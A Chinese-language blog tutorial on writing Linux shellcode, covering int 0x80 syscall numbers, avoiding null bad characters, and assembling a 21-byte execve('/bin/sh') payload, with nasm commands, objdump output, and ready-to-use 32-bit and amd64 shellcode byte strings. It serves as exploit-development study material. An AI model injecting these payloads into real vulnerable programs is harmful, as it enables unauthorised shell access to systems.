---
title: Shellcode 's Magic
date: 2018-07-10 23:14:24
tags: basic
layout: default
---
shellcode 原理 & 21byte shllcode 
<!--more-->
# Shellcode
    Shellcode实际是一段代码（也可以是填充数据），是用来发送到服务器利用特定漏洞的代码，一般可以获取权限.
    虽然shellcode不常用 但是每次用到都要找博客比较麻烦今天整理一下。

## int 0x80
    将shellcode不得不提到汇编，也不得不提到int 0x80(实现系统调用）
    这里记录一下调用号
[常用的的调用号][1]
EAX | Name | EBX | ECX | EDX 
- | :-: | :-: | :-: | :-: |
1 | sys_exit | int 
3 | sys_read | unsigned int | char *  | size_t
4 | sys_write | unsigned int | const char * | size_t
5 | sys_open | const char * | int | int 
11 | sys_execve | struct pt_regs

    平时用的最多的是11号调用 execve("/bin/sh",0,0)
    也就是要求
 Reg | Vul
 :-: | :-:
 EAX | 11
 EBX | addr_of_sh
 ECX | 0
 EDX | 0

我们后面编写 shellcode 主要也是基于这个调用

## Make shellcode Yourself
自己编写 shellcode 主要优点 是灵活 可以随机应变 在一些特殊情况下可以编写 特定的 shellcode 或者 利用一些 寄存器原始值 来编写 十分短的shellcode.

### 坏字符
一般情况下首先考虑的是坏字符 其中0x00是最常遇到的问题 最常见的是使用xor

xor ax,ax ==> 0->ax

还有就是在mov时容易出现0x00
因为mov eax ,5;
其实是mov eax ,0x00000005
所以应该使用 mov al,5;

0xa坏字符遇到的不太多...如要绕过可以通过！@#￥%

### 参数/bin/sh
常见的做法是压入栈然后取eap
也就是
```asm
push 0x68732f2f
push 0x6e69622f 
mov ebx，esp
```

### Make it
souce:
```asm
Section .text
    global _start
_start:
	xor ecx, ecx
	mul ecx
	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0xb
	int 0x80
```
编译 链接 命令如下
```
nasm -f elf64 shellcode.asm -o shellcode.o
# 32位系统 用-f elf 
ld -s shellcode.o -o shellcode 
```
反汇编之后#objdump -d 

```
00000000 <_start>:
   0:	31 c9                	xor    %ecx,%ecx
   2:	f7 e1                	mul    %ecx
   4:	51                   	push   %ecx
   5:	68 2f 2f 73 68       	push   $0x68732f2f
   a:	68 2f 62 69 6e       	push   $0x6e69622f
   f:	89 e3                	mov    %esp,%ebx
  11:	b0 0b                	mov    $0xb,%al
  13:	cd 80                	int    $0x80
```
这里我们采用最灵活的人脑提取法得到shellcode
```
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
#浓缩的21byte
```


amd64shellcode
```
shellcode= "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
```

[1]: https://blog.csdn.net/xiaominthere/article/details/17287965